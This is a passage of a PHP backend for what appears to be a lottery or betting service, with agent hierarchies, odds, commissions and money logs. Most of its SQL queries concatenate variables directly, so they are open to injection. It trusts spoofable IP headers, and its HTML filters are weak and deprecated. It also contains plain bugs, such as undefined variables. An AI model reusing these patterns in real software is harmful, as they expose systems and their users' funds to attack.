    while ($psql->next_record()) {
        $user[$i]['userid'] = $psql->f('userid');
        if ($uid != 99999999) {
            if($psql->f('ifagent')==0){
                 $user[$i]['username'] = $psql->f('username') . '[会员]';
                 $user[$i]['layername'] = "会员";
            }else{
                 $user[$i]['username'] = $psql->f('username') . '[' . trim($config['layer'][$psql->f('layer') - 1]) . ']';
                 $user[$i]['layername'] = $config['layer'][$psql->f('layer') - 1];
            }
        } else {
            $user[$i]['username'] = $psql->f('username'). '[一级]';
            $user[$i]['layername'] = "一级代理";
        }
        $user[$i]['user'] = $psql->f('username');
        $user[$i]['name'] = $psql->f('name');
        $user[$i]['money'] = pr1($psql->f('kmoney')+$psql->f('money'));
        $user[$i]['layer']   = $psql->f('layer');
        $user[$i]['ifagent'] = $psql->f('ifagent');
        $user[$i]['wid']     = $psql->f('wid');
        $i++;
    }
    return $user;
}
function getmaxren($fid)
{
    global $psql, $tb_user;
    if ($fid == 99999999) {
        global $config;
        $psql->query("select sum(maxren),count(id) from     `$tb_user` where fid='$fid'");
        $psql->next_record();
        return $config['maxren'] - $psql->f(0) - $psql->f(1);
    }
    $psql->query("select maxren from    `$tb_user` where userid='$fid'");
    $psql->next_record();
    $theren = $psql->f('maxren');
    $psql->query("select sum(maxren),count(id) from     `$tb_user` where fid='$fid' and ifson=0");
    $psql->next_record();
    return $theren - $psql->f(0) - $psql->f(1) - 1;
}
function getmaxyingdenyje($fid)
{
    global $psql, $tb_user;
    if ($fid == 99999999) {
        global $config;
        $psql->query("select sum(yingdenyje) from   `$tb_user` where fid='$fid'");
        $psql->next_record();
        return $config['yingdenyje'] - $psql->f(0);
    }
    $psql->query("select yingdenyje from    `$tb_user` where userid='$fid'");
    $psql->next_record();
    $the = $psql->f('yingdenyje');
    $psql->query("select sum(yingdenyje) from   `$tb_user` where fid='$fid'");
    $psql->next_record();
    return $the - $psql->f(0);
}

function transtb($tb, $field, $whi, $v)
{
    global $tsql;
    $tsql->query("select $field from $tb where $whi='$v'");
    $tsql->next_record();
    return $tsql->f($field);
}
function checkfid($uid)
{
    global $psql, $tb_user, $userid;
    if ($userid == 99999999)
        return true;
    if ($uid == $userid)
        return false;
    if (transuser($userid, 'status') == 0)
        return false;
    $layer  = transuser($userid, 'layer');
    $ulayer = transuser($uid, 'layer');
    if ($layer == $ulayer) {
        $psql->query("select fid from `$tb_user` where userid='$uid'");
        $psql->next_record();
        if ($psql->f('fid') == $userid)
            return true;
    }
    while ($ulayer >= $layer) {
        $psql->query("select layer,fid from `$tb_user` where userid='$uid'");
        $psql->next_record();
        $ulayer = $psql->f('layer');
        if ($ulayer == $layer) {
            break;
        }
        $uid = $psql->f('fid');
    }
    if ($userid == $uid)
        return true;
    else
        return false;
}
function userchange($action, $uid,$ip='')
{
    global $userid, $userid2, $tb_user_edit, $adminid, $psql;
    if($ip=='' | $ip==null) $modiip   = getip();
    else $modiip   = $ip;
    $sql      = "insert into `$tb_user_edit` set modiip='$modiip',moditime=NOW(),action='$action',userid='$uid'";
    if ($userid == 99999999) {
        $sql .= ",modiuser='$userid',modisonuser='$adminid'";
    } else {
        if($userid2=='') $userid2=0;
        $sql .= ",modiuser='$userid',modisonuser='$userid2'";
    }
    $psql->query($sql);
    return true;
}
function usermoneylog($uid,$money,$usermoney,$action,$type=1,$ips='')
{
    global $userid, $userid2, $tb_money_log, $adminid, $psql;
    if($ips=='' | $ips==null) $ip   = getip();
    else $ip = $ips;
    $sql      = "insert into `$tb_money_log` set ip='$ip',time=NOW(),bz='$action',userid='$uid',money='$money',usermoney='$usermoney',type='$type'";
    if ($userid == 99999999) {
        $sql .= ",modiuser='$userid',modisonuser='$adminid'";
    } else {
        if($userid2=='') $userid2=0;
        $sql .= ",modiuser='$userid',modisonuser='$userid2'";
    }
    $psql->query($sql);
    return true;
}

function sessiondela()
{
    unset($_SESSION['auid2']);
    unset($_SESSION['auid']);
    unset($_SESSION['apasscode']);
    unset($_SESSION['atype']);
    unset($_SESSION['acheck']);
    //unset($_SESSION['wid']);
    unset($_SESSION['gid']);
    unset($_SESSION['sv']);
    unset($_SESSION['guest']);
    //unset($_SESSION['login']);
}
function sessiondelu()
{
    unset($_SESSION['uuid']);
    unset($_SESSION['upasscode']);
    unset($_SESSION['ucheck']);
    //unset($_SESSION['wid']);
    unset($_SESSION['gid']);
    unset($_SESSION['sv']);
    unset($_SESSION['guest']);
    //unset($_SESSION['login']);
}
function cutdate1($v)
{
    $v = explode('-', $v);
    if (count($v) != 3)
        return 0;
    if (!is_numeric($v[0]) | !is_numeric($v[1]) | !is_numeric($v[2])) {
        return 0;
    }
    return mktime(1, 1, 1, $v[1], $v[2], $v[0]);
}
function cutdate2($v)
{
    $v = explode('-', $v);
    if (count($v) != 3)
        return 0;
    if (!is_numeric($v[0]) | !is_numeric($v[1]) | !is_numeric($v[2])) {
        return 0;
    }
    return mktime(23, 59, 59, $v[1], $v[2], $v[0]);
}

function getdis($uid,$ifagent,$layer,$fudong){
    global $config,$tb_user,$tb_lib,$tsql;
    if(date("His")<str_replace(':','',$config['editstart'])){
        $start = date("Y-m-d ",time()-86400).$config['editend'];
        $end = date("Y-m-d ").$config['editstart'];
    }else{
        $start = date("Y-m-d ").$config['editend'];
        $end = date("Y-m-d ",time()+86400).$config['editstart'];
    }
    
    if($ifagent==0){
        $sql = "select 1 from `$tb_lib` where userid='$uid' and time>='$start' and time<='$end' limit 1";
    }else{
        $sql = "select 1 from `$tb_lib` where uid".$layer."='$uid' and time>='$start' and time<='$end' limit 1";
    }
    
    $tsql->query($sql);
    $tsql->next_record();
    if($tsql->f(0)==1){
       return 0;
    }else{
       return 1;
    }
}

function getusergroup2($uid, $layer)
{
    global $tb_user, $tsql;
    $str     = '|' . $uid;
    $melayer = transuser($uid, 'layer');
    if ($melayer == 6)
        exit;
    $tsql->query("select userid from `$tb_user` where fid" . $melayer . "='" . $uid . "' and layer='$layer' and ifson=0");
    $xout = '';
    while ($tsql->next_record()) {
        $xout .= "|" . $tsql->f('userid') . "|";
    }
    return $xout;
}
function checkuid($uid)
{
    if (!is_numeric($uid) | strlen($uid) != 8)
        return false;
    else
        return true;
}
function isma($v)
{
    if (is_numeric($v) & $v >= 1 & $v <= 49) {
        return true;
    } else {
        return false;
    }
}


function getzcs($class, $uid)
{
    global $tb_zpan, $psql, $gid;
    //$gids = transgame($gid,'fenlei');
    $psql->query("select * from `$tb_zpan` where userid='$uid' and gid='$gid' and class='$class'");
    $psql->next_record();
    $arr['peilvcha'] = pr4($psql->f('peilvcha'));
    $arr['lowpeilv'] = pr4($psql->f('lowpeilv'));
    return $arr;
}
function getzcs8($class, $uid, $gid)
{
    global $tb_zpan,$psql;
    //$gids = transgame($gid,'fenlei');
    $psql->query("select * from `$tb_zpan` where userid='$uid' and gid='$gid' and class='$class'");
    $psql->next_record();
    $arr['peilvcha'] = pr4($psql->f('peilvcha'));
    $arr['lowpeilv'] = pr4($psql->f('lowpeilv'));
    return $arr;
}

function getjes($class, $uid)
{
    global $tb_points, $psql, $gid;
    //$gids = transgame($gid,'fenlei');
    $psql->query("select cmaxje,maxje,minje from `$tb_points` where userid='$uid' and gid='$gid' and class='$class'");
    $psql->next_record();
    $arr['cmaxje'] = pr0($psql->f('cmaxje'));
    $arr['maxje'] = pr0($psql->f('maxje'));
    $arr['minje'] = pr0($psql->f('minje'));
    return $arr;
}
function getjes8($class, $uid, $gid)
{
    global $tb_points,$psql;
    //$gids = transgame($gids,'fenlei');
    $psql->query("select cmaxje,maxje,minje from `$tb_points` where userid='$uid' and gid='$gid' and class='$class'");
    $psql->next_record();
    $arr['cmaxje'] = pr0($psql->f('cmaxje'));
    $arr['maxje'] = pr0($psql->f('maxje'));
    $arr['minje'] = pr0($psql->f('minje'));
    return $arr;
}

function getpoints($class, $abcd, $ab, $uid)
{
    global $tb_points, $psql, $gid;
    //$gids = transgame($gid,'fenlei');
    $abcd = strtolower($abcd);
    if ($abcd == '0')
        $abcd = 'a';
    $psql->query("select $abcd from `$tb_points` where userid='$uid' and gid='$gid' and class='$class' and ab='$ab'");
    $psql->next_record();
    return pr2($psql->f($abcd));
}
function getpoints8($class, $abcd, $ab, $uid, $gid)
{
    global $tb_points, $psql;
    //$gids = transgame($gid,'fenlei');
    $abcd = strtolower($abcd);
    if ($abcd == '0')
        $abcd = 'a';
    $psql->query("select $abcd from `$tb_points` where userid='$uid' and gid='$gid' and class='$class' and ab='$ab'");
    $psql->next_record();
    return pr2($psql->f($abcd));
}
function transatt($class, $field,$f=0)
{
    global $tb_att, $psql, $gid;
    if($f==1){
       $psql->query("select $field from `$tb_att` where gid='$gid' and bc='$class'");
    }else{
       $psql->query("select $field from `$tb_att` where gid='$gid' and class='$class'");
    }
    $psql->next_record();
    return pr4($psql->f($field));
}
function transatt8($class, $field, $gid,$f=0)
{
    global $tb_att, $psql;
    if($f==1){
       $psql->query("select $field from `$tb_att` where gid='$gid' and bc='$class'");
    }else{
       $psql->query("select $field from `$tb_att` where gid='$gid' and class='$class'");
    }
    $psql->next_record();
    return pr4($psql->f($field));
}
function echoinput($id, $val)
{
    if ($val == '')
        $val = '0';
    return "<input class='commission' type='text' value='$val' id='$id' name='$id' />";
}
function echousercs($id, $val, $m)
{
    if ($val == '')
        $val = '0';
    return "<input class='amount' type='text' value='$val' id='$id' name='$id' m='$m' />";
}
function echousercs8($id, $val, $m)
{
    if ($val == '')
        $val = '0';
    return "<input  type='text' value='$val' id='$id' name='$id' m='$m' />(<label>$m</label>)";
}
function pointsselect($id, $uid, $class, $abcd, $ab, $fid)
{
    $pointsatt = transatt($class, 'pointsatt',1);
    $maxpoints = p2(getpoints($class, $abcd, $ab, $fid));
    $val       = getpoints($class, $abcd, $ab, $uid);
    $id        = $id . '_' . $class;
    $str       = "<select   name='$id' id='$id'>";
    for ($i = 0; p2($i) <= $maxpoints; $i += $pointsatt) {
        $str .= "<option aaa='$val' value='$i' ";
        if (p2($i) == p2($val)) {
            $str .= "  selected ";
        }
        $str .= " >" . ($i / 100) . "</option>";
    }
    $str .= "</select>";
    return $str;
}
function pointsselect82($id, $uid, $class, $abcd, $ab, $fid, $gid)
{
    $pointsatt = transatt8($class, 'pointsatt', $gid,1);
    $maxpoints = p2(getpoints8($class, $abcd, $ab, $fid, $gid));
    $val       = getpoints8($class, $abcd, $ab, $uid, $gid);
    $id        = $id . $gid . $class;
    $str       = "<select   name='$id' id='$id'>";
    for ($i = 0; p2($i) <= $maxpoints; $i += $pointsatt) {
        $str .= "<option aaa='$val' value='$i' ";
        if (p2($i) == p2($val)) {
            $str .= "  selected ";
        }
        $str .= " >" . $i . "</option>";
    }
    $str .= "</select>";
    return $str;
}
function pointsselect8($id, $uid, $class, $abcd, $ab, $fid, $gid, $fenlei)
{
    $pointsatt = transatt8($class, 'pointsatt', $gid,1);
    $maxpoints = p2(getpoints8($class, $abcd, $ab, $fid, $gid));
    $val       = getpoints8($class, $abcd, $ab, $uid, $gid);
    $id        = $id . $fenlei . $class;
    $str       = "<select   name='$id' id='$id'>";
    for ($i = 0; p2($i) <= $maxpoints; $i += $pointsatt) {
        $str .= "<option aaa='$val' value='$i' ";
        if (p2($i) == p2($val)) {
            $str .= "  selected ";
        }
        $str .= " >" . $i . "</option>";
    }
    $str .= "</select>";
    return $str;
}
function pointsselecttop($id, $uid, $class, $abcd, $ab, $fid)
{
    $pointsatt = transatt($class, 'pointsatt',1);
    $maxpoints = p2(transatt($class, 'points',1));
    $val       = getpoints($class, $abcd, $ab, $uid);
    $id        = $id . '_' . $class;
    $str       = "<select aaa='$val'  name='$id' id='$id'>";
    for ($i = 0; p2($i) <= $maxpoints; $i += p2($pointsatt)) {
        $str .= "<option value='$i' ";
        if (p2($i) == p2($val)) {
            $str .= " selected ";
        }
        $str .= " >" . $i . "</option>";
    }
    $str .= "</select>";
    return $str;
}
function pointsselecttop8($id, $uid, $class, $abcd, $ab, $fid,$gid)
{
    $val       = getpoints8($class, $abcd, $ab, $uid,$gid);
    $id        = $id . '_' . $class;
    return "<input type='text' class='commission' value='$val' id='$id' name='$id' m='$m' />";
    
    $pointsatt = transatt8($class, 'pointsatt',$gid,1);
    $maxpoints = p2(transatt8($class, 'points',$gid,1));
    
    $id        = $id . '_' . $class;
    $str       = "<select aaa='$val'  name='$id' id='$id'>";
    for ($i = 0; p2($i) <= $maxpoints; $i += p2($pointsatt)) {
        $str .= "<option value='$i' ";
        if (p2($i) == p2($val)) {
            $str .= " selected ";
        }
        $str .= " >" . $i . "</option>";
    }
    $str .= "</select>";
    return $str;
}
function peilvchaselect($id, $class, $val)
{
    $peilvatt = transatt($class, 'peilvatt');
    $maxatt   = p3(transatt($class, 'maxatt'));
    $str      = "<select  name='$id' id='$id'>";
    for ($i = 0; p3($i) <= $maxatt; $i += p3($peilvatt)) {
        $str .= "<option value='$i' ";
        if (p3($i) == p3($val)) {
            $str .= " selected ";
        }
        $str .= " >" . $i . "</option>";
    }
    $str .= "</select>";
    return $str;
}
function peilvchaselect82($id, $class, $val, $gid)
{
    $peilvatt = transatt8($class, 'peilvatt', $gid);
    $maxatt   = p3(transatt8($class, 'maxatt', $gid));
    $id       = $id . $gid . $class;
    $str      = "<select  name='$id' id='$id'>";
    for ($i = 0; p3($i) <= $maxatt; $i += p3($peilvatt)) {
        $str .= "<option value='$i' ";
        if (p3($i) == p3($val)) {
            $str .= " selected ";
        }
        $str .= " >" . $i . "</option>";
    }
    $str .= "</select>";
    return $str;
}
function peilvchaselect8($id, $class, $val, $gid, $fenlei)
{
    $peilvatt = transatt8($class, 'peilvatt', $gid);
    $maxatt   = p3(transatt8($class, 'maxatt', $gid));
    $id       = $id . $fenlei . $class;
    $str      = "<select  name='$id' id='$id'>";
    for ($i = 0; p3($i) <= $maxatt; $i += p3($peilvatt)) {
        $str .= "<option value='$i' ";
        if (p3($i) == p3($val)) {
            $str .= " selected ";
        }
        $str .= " >" . $i . "</option>";
    }
    $str .= "</select>";
    return $str;
}
function peilvchaselecttop($id, $class)
{
    $peilvatt = p3(transatt($class, 'peilvatt'));
    $val      = transatt($class, 'maxatt');
    $str      = "<select  name='$id' id='$id'>";
    for ($i = 0; p3($i) <= $peilvatt * 150; $i += p3($peilvatt)) {
        $str .= "<option value='$i' ";
        if (p3($i) == p3($val)) {
            $str .= " selected ";
        }
        $str .= " >" . $i . "</option>";
    }
    $str .= "</select>";
    return $str;
}
function peilvchaselecttop8($id, $class,  $gid)
{
    $peilvatt = p3(transatt8($class, 'peilvatt',$gid));
    $val      = transatt8($class, 'maxatt',$gid);
    $str      = "<select  name='$id' id='$id'>";
    for ($i = 0; p3($i) <= $peilvatt * 150; $i += p3($peilvatt)) {
        $str .= "<option value='$i' ";
        if (p3($i) == p3($val)) {
            $str .= " selected ";
        }
        $str .= " >" . $i . "</option>";
    }
    $str .= "</select>";
    return $str;
}

function gettopuid($uid, $layer)
{
    global $psql, $tb_user;
    if ($layer == 1)
        return $uid;
    $psql->query("select fid1 from `$tb_user` where userid='$uid'");
    $psql->next_record();
    return $psql->f('fid1');
}
function moren($as, $bs)
{
    return $as;
    if ($as < $bs)
        return $bs;
    else
        return $as;
}
function page($pc, $p)
{
    $str = '';
    for ($i = 1; $i <= $pc; $i++) {
        $str .= "<a href='javascript:void(0);' class='page";
        if ($i == $p) {
            $str .= " current";
        }
        $str .= "'>" . $i . "<a>&nbsp;&nbsp;";
    }
    return $str;
}
function gettopid($uid)
{
    global $tsql, $tb_user;
    while (1) {
        $tsql->query("select fid,layer from `$tb_user` where userid='$uid'");
        $tsql->next_record();
        if ($tsql->f('layer') == 1) {
            return $uid;
        }
        if ($tsql->f('layer') == 2) {
            return $tsql->f('fid');
        }
        $uid = $tsql->f('fid');
    }
}
function getzhong($qishu, $pid)
{
    global $psql, $tb_z, $gid;
    $psql->query("select 1 from `$tb_z` where gid='$gid' and qishu='$qishu' and pid='$pid'");
    $psql->next_record();
    return pr0($psql->f(0));
}
function rweek($v)
{
    switch ($v) {
        case 1:
            $v = '星期一';
            break;
        case 2:
            $v = '星期二';
            break;
        case 3:
            $v = '星期三';
            break;
        case 4:
            $v = '星期四';
            break;
        case 5:
            $v = '星期五';
            break;
        case 6:
            $v = '星期六';
            break;
        default:
            $v = '星期日';
            break;
    }
    return $v;
}
function transxtype($val)
{
    if ($val == 0) {
        $val = "下注";
    } else if ($val == 1) {
        $val = "内补";
    } else if ($val == 2) {
        $val = "外补";
    }
    return $val;
}
function transzt($val)
{
    if ($val == 7) {
        $val = "无效";
    }else {
        $val = "正常";
    }
    return $val;
}
function transflytype($v)
{
    if ($v == 0) {
        $v = "手动";
    } else {
        $v = "自动";
    }
    return $v;
}
function transfly($v)
{
    if ($v == 0)
        $v = '禁止';
    else if ($v == 1)
        $v = '内补';
    else if ($v == 2)
        $v = '外补';
    else if ($v == 3)
        $v = '内外补';
    return $v;
}
function getip()
{
    static $realip;
    if (isset($_SERVER)) {
        if (isset($_SERVER["HTTP_X_FORWARDED_FOR"])) {
            $realip = $_SERVER["HTTP_X_FORWARDED_FOR"];
        } else if (isset($_SERVER["HTTP_CLIENT_IP"])) {
            $realip = $_SERVER["HTTP_CLIENT_IP"];
        } else {
            $realip = $_SERVER["REMOTE_ADDR"];
        }
    } else {
        if (getenv("HTTP_X_FORWARDED_FOR")) {
            $realip = getenv("HTTP_X_FORWARDED_FOR");
        } else if (getenv("HTTP_CLIENT_IP")) {
            $realip = getenv("HTTP_CLIENT_IP");
        } else {
            $realip = getenv("REMOTE_ADDR");
        }
    }
    if (strpos($realip, ',')) {
        $realip = explode(',', $realip);
        $realip = $realip[0];
    }
    if(strlen($ip)>15){
		return '0.0.0.0';
	}
    return $realip;
}
function fast3qishu($qishu)
{
    $cq  = count($qishu);
    $cq3 = $cq % 3 == 0 ? $cq / 3 : (($cq - $cq % 3) / 3) + 1;
    for ($i = 0; $i < $cq3; $i++) {
        if ($qishu[$i * 3 + 1] == '' & $qishu[$i * 3 + 2] == '') {
            $q[$i] = $qishu[$i * 3] . ' ~ ' . $qishu[$i * 3];
        } else if ($qishu[$i * 3 + 2] == '') {
            $q[$i] = $qishu[$i * 3] . ' ~ ' . $qishu[$i * 3 + 1];
        } else {
            $q[$i] = $qishu[$i * 3] . ' ~ ' . $qishu[$i * 3 + 2];
        }
    }
    return $q;
}
function rserver()
{
    global $tb_config, $psql;
    $psql->query("select s1,s2,s3,s4,s5,s6 from `$tb_config`");
    $psql->next_record();
    for ($i = 1; $i <= 6; $i++) {
        if ($_SERVER['SERVER_ADDR'] == $psql->f('s' . $i)) {
            return $i;
        }
    }
}
function wf($g, $b, $s, $c, $p)
{
    $p = "[".$p."]";
    if($b=="番摊"){
        return $c . '-' . $p;
    }else if ($g == 100 || $g == 200) {
        if ($s == '過關'){
            return $p;        
        }else if($b=='生肖連' || $b=='尾數連'){
            return  $p;
        }
        else{
            return $s . '-' . $p;
        }
    } else if (($g == 101 | $g==163) && $s!='番摊') {
        switch ($b) {
            case "1~5":
            case "1~3":
                return $s . '-' . $p;
                break;
            case "1字组合":
                return $c . '-' . $p;
                break;
            case "2字组合":
                return $p;
                break;
            case "2字定位":
                return $p;
                break;
            case "2字和数":
                return $s . '-' . $p;
                break;
            case "3字组合":
                return $p;
                break;
            case "3字定位":
                return $p;
                break;
            case "3字和数":
                if ($c == '尾数')
                    return $s . '-' . $c . '-' . $p;
                else
                    return $s . '-' . $p;
                break;
            case "总和龙虎":
                if ($c == '总和尾数' | $c == '总和数')
                    return $s . '-' . $c . '-' . $p;
                else
                    return $s . '-' . $p;
                break;
            case "组选3":
                return $p;
                break;
            case "组选6":
                return $p;
                break;
            case "牛牛梭哈":
                return $c;
                break;
            case "跨度":
                return $c . '-' . $p;
                break;
            case "前中后三":
            case "前三":
                return $s . '-' . $p ;
                break;
        }
    } else {
        return $b . '-' . $p;
    }
}
function wf2($g, $b, $s, $c)
{
    //$p = "『".$p."』";
    if($b=="番摊"){
        return $c;
    }else if ($g == 100 || $g == 200) {
        if ($s == '過關')
            return $b;
        else
            return $s ;
    } else if (($g == 101 | $g==163) && $s!='番摊') {
        switch ($b) {
            case "1~5":
            case "1~3":
                return $s ;
                break;
            case "1字组合":
                return $c ;
                break;
            case "2字和数":
                return $s ;
                break;
            case "2字组合":
                return $p;
                break;
            case "2字定位":
                return $p;
                break;
            case "3字组合":
                return $p;
                break;
            case "3字定位":
                return $p;
                break;
            case "3字和数":
                if ($c == '尾数')
                    return $s . '-' . $c ;
                else
                    return $s ;
                break;
            case "总和龙虎":
                if ($c == '总和尾数' | $c == '总和数')
                    return $s . '-' . $c ;
                else
                    return $s ;
                break;
            case "牛牛梭哈":
                return $c;
                break;
            case "跨度":
                return $c ;
                break;
            case "前中后三":
            case "前三":
                return $s . '-' . $c ;
                break;
        }
    } else {
        return $b ;
    }
}



function wfuser($g, $b, $s, $c, $p)
{
    $p = "".$p."";
    if($b=="番摊"){
        return $c . '--' . $p;
    }else if ($g == 100 || $g == 200) {
        if ($s == '過關'){
            return $p;        
        }else if($b=='生肖連' || $b=='尾數連'){
            return  $p;
        }
        else{
            return $s . '--' . $p;
        }
    } else if (($g == 101 | $g==163) && $s!='番摊') {
        switch ($b) {
            case "1~5":
            case "1~3":
                return $s . ' ' . $p;
                break;
            case "1字组合":
                return $c . ' ' . $p;
                break;
            case "2字组合":
                return $p;
                break;
            case "2字定位":
                return $p;
                break;
            case "2字和数":
                return $s . ' ' . $p;
                break;
            case "3字组合":
                return $p;
                break;
            case "3字定位":
                return $p;
                break;
            case "3字和数":
                if ($c == '尾数')
                    return $s . ' ' . $c . ' ' . $p;
                else
                    return $s . ' ' . $p;
                break;
            case "总和龙虎":
                if ($c == '总和尾数' | $c == '总和数')
                    return $s . ' ' . $c . ' ' . $p;
                else
                    return $s . ' ' . $p;
                break;
            case "组选3":
                return $p;
                break;
            case "组选6":
                return $p;
                break;
            case "牛牛梭哈":
                return $c;
                break;
            case "跨度":
                return $c . ' ' . $p;
                break;
            case "前中后三":
            case "前三":
                return $s . ' ' . $p ;
                break;
        }
    } else {
        if($s=='冠亚和'){
            return $s . ' ' . $p;
        }else{
            return $b . ' ' . $p;
        }
        
    }
}


function encode($arr)
{
    $code = base64_encode(implode('_', $arr));
    $cc   = strlen($code);
    $n1   = array();
    $n2   = array();
    $n3   = array();
    for ($i = 0; $i < $cc; $i++) {
        if ($i % 3 == 0) {
            $n1[] = $code[$i];
        } else if ($i % 3 == 1) {
            $n2[] = $code[$i];
        } else if ($i % 3 == 2) {
            $n3[] = $code[$i];
        }
    }
    return implode("", $n3) . implode("", $n2) . implode("", $n1);
}
function decode($str)
{
    $ct = strlen($str);
    $yu = $ct % 3;
    if ($yu == 2) {
        $chu = ($ct - 1) / 3;
        $n3  = substr($str, 0, $chu);
        $n2  = substr($str, $chu, $chu * 2 + 1);
        $n1  = substr($str, $chu * 2 + 1);
    } else {
        $chu = ($ct - $yu) / 3;
        $n3  = substr($str, 0, $chu);
        $n2  = substr($str, $chu, $chu * 2);
        $n1  = substr($str, $chu * 2);
    }
    $code = '';
    $chu += 1;
    for ($i = 0; $i < $chu; $i++) {
        $code .= $n1[$i] . $n2[$i] . $n3[$i];
    }
    $code = base64_decode($code);
    $arr  = explode('_', $code);
    return $arr;
}
function transip($ip)
{
    if(!preg_match("/^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$/", $ip)) return '';
    //return 'a';
    //return '';
    include("../global/Iplocation_Class.php");
    $ips = new IpLocation("../dat/QQWry.Dat");
    return mb_convert_encoding($ips->getaddress($ip), 'utf-8', 'GBK');
    //return iconv('','utf-8',$ips->getaddress($ip));
}

function getonline($uid){
    global $tsql,$tb_online,$tb_user;
    if($uid==99999999){
       $tsql->query("select count(id) from `$tb_online`");
       $tsql->next_record();
       return $tsql->f(0);
    }
    $layer = transuser($uid,"layer");
    $tsql->query("select count(id) from `$tb_user` where fid".$lyaer."='$uid' and online=1");
       $tsql->next_record();
       return $tsql->f(0);
}
function transstatus($v){
    if($v==1){
       $v='启用';
    }else if($v==2){
       $v='冻结';
    }else{
       $v='停用'; 
    }
    return $v;
}
function messreplace($str, $arr)
{
    $str = str_replace('{期数}', $arr[0], $str);
    $str = str_replace('{公司名称}', $arr[1], $str);
    $str = str_replace('{开盘时间}', $arr[2], $str);
    $str = str_replace('{关盘时间}', $arr[3], $str);
    $str = str_replace('{开奖时间}', $arr[4], $str);
    return $str;
}
function rpage($p){
    if (!is_numeric($p) | $p < 0 | $p%1!=0) $p=1;
    return $p; 
}

function safehtml($text)
{
    $text = stripslashes($text);
    $text = eregi_replace("<a[^>]+href *= *([^ >]+)[^>]*[>]?" , "<a href=\\1>" , $text);
    $text = eregi_replace("<img[^>]+src *= *([^ >]+)[^>]*>" , "<img src=\\1 alt=\"\" border=\"0\">" , $text);
    $text = eregi_replace("<(abbr|acronym|b|big|blockquote|center|code|dd|del|dl|dt|em|h1|h2|h3|h4|h5|h6|hr|i|ins|kbd|li|ol|p|pre|q|s|samp|small|strike|strong|sub|sup|tt|u|ul|var) +[^>]*>" , "<\\1>" , $text);
    $text = eregi_replace("<(br)[ ]*[^>]*>" , "<\\1 />" , $text);
    return $text;
}

function safeshtml($text)
{
    $text = stripslashes($text);
    $text = strip_tags($text , "<a><b><em><i><strong><u>");
    $text = eregi_replace("<a[^>]+href *= *([^ >]+)[^>]*[>]?" , "<a href=\\1>" , $text);
    $text = eregi_replace("<(b|em|i|strong|u) +[^>]*>" , "<\\1>" , $text);
    return $text;
}

function array_filters($v) {
    if ($v != "") {
        return true;
    }
    return false;
}
function getzcp($zc,$sql){
    global $psql,$tb_lib;
    $psql->query("select min($zc),max($zc) $sql");
    $psql->next_record();
    if($psql->f(0)==$psql->f(1)){
        return $psql->f(0).'%';
    }else{
        return $psql->f(0).'%/'.$psql->f(1).'%';;
    }
}

function getthisdate(){
    global $config;
    $his = date("His");
    if($his<str_replace(':','',$config['editstart'])){
        $date = date("Y-m-d",time()-86400);
    }else{
        $date = date("Y-m-d");
    }
    return $date;
}

function getjrsy($userid){
    global $tb_lib,$psql;
    if($userid==99999999) {
        $layer = 0;
        $myzcstr = 'zc' . $layer;
        $mypointsstr = 'points' . $layer;
        $mypeilv1str = 'peilv1' . $layer;
        $mypeilv2str = 'peilv2' . $layer;

        $uidstrdown = 'uid' . ($layer + 1);
        $pointsstrdown = 'points' . ($layer + 1);
        $peilv1strdown = 'peilv1' . ($layer + 1);
        $peilv2strdown = 'peilv2' . ($layer + 1);
        $theday = getthisdate();
        $whi = " from `$tb_lib` where dates='$theday' and bs=1 and xtype!=2 and z not in(2,7,9)";
        $sql = "select sum($myzcstr*je/100)
                           ,sum(if($uidstrdown=0,(points*$myzcstr*je/(100*100)),$pointsstrdown*$myzcstr*je/(100*100))) 
                             $whi";
        $psql->query($sql);
        $psql->next_record();
        $mezc = $psql->f(0);
        $meshui = $psql->f(1);
        $sql = "select sum(if($uidstrdown=0,(peilv1*$myzcstr)*je/100,$peilv1strdown*$myzcstr*je/100)) $whi and z=1";
        $psql->query($sql);
        $psql->next_record();
        $mezhong = pr1($psql->f(0));
        $sql = "select sum(if($uidstrdown=0,(peilv2*$myzcstr)*je/100,$peilv2strdown*$myzcstr*je/100)) $whi and z=3";
        $psql->query($sql);
        $psql->next_record();
        $mezhong += pr1($psql->f(0));

        $yk = p1($mezc - $mezhong - $meshui);
    }else{
        $layer = transuser($userid, 'layer');
        $myid = 'uid' . $layer;
        $myzcstr = 'zc' . $layer;
        $mypointsstr = 'points' . $layer;
        $mypeilv1str = 'peilv1' . $layer;
        $mypeilv2str = 'peilv2' . $layer;
        if ($layer < 8) {
            $uidstrdown = 'uid' . ($layer + 1);
            $pointsstrdown = 'points' . ($layer + 1);
            $peilv1strdown = 'peilv1' . ($layer + 1);
            $peilv2strdown = 'peilv2' . ($layer + 1);
        } else {
            $uidstrdown = 'userid';
            $pointsstrdown = 'points';
            $peilv1strdown = 'peilv1';
            $peilv2strdown = 'peilv2';
        }
        $theday = getthisdate();
        $whi = " from `$tb_lib` where $myid='$userid' and dates='$theday' and bs=1 and xtype!=2 and z not in(2,7,9)";
        $sql = "select sum($myzcstr*je/100)
                           ,sum(if($uidstrdown=0,(points*$myzcstr*je/(100*100)),$pointsstrdown*$myzcstr*je/(100*100))) 
                             $whi";
        $psql->query($sql);
        $psql->next_record();
        $mezc = $psql->f(0);
        $meshui = $psql->f(1);
        $sql = "select sum(if($uidstrdown=0,(peilv1*$myzcstr)*je/100,$peilv1strdown*$myzcstr*je/100)) $whi and z=1";
        $psql->query($sql);
        $psql->next_record();
        $mezhong = pr1($psql->f(0));
        $sql = "select sum(if($uidstrdown=0,(peilv2*$myzcstr)*je/100,$peilv2strdown*$myzcstr*je/100)) $whi and z=3";
        $psql->query($sql);
        $psql->next_record();
        $mezhong += pr1($psql->f(0));

        $yk = p1($mezc - $mezhong - $meshui);
    }

    return $yk;
}


function userflylog($v1,$v2){
    global $userid, $userid2, $tb_user_edit, $adminid, $psql;
    $modiip   = getip();
    if($v1["je"]!=$v2["je"] || $v1["ifok"]!=$v2["ifok"]){
         $action = "自动补货";
         $uid = $userid;
         $sql      = "insert into `$tb_user_edit` set modiip='$modiip',moditime=NOW(),action='$action',userid='$uid'";
         $sql .= ",modiuser='$userid',modisonuser='$userid2'";
         $title = $v2["gname"]."<br>【".$v2["ftypename"]." 自动补货】";
         $oldvalue = "注额：".$v1["je"]."<br>【".transflys($v1["ifok"])."】";
         $newvalue = "注额：".$v2["je"]."<br>【".transflys($v2["ifok"])."】";
         $sql .= ",title='$title',oldvalue='$oldvalue',newvalue='$newvalue'";
         //echo $sql;
        $psql->query($sql);
    }
}

function transflys($v){
   if($v==1){
       return "启用";
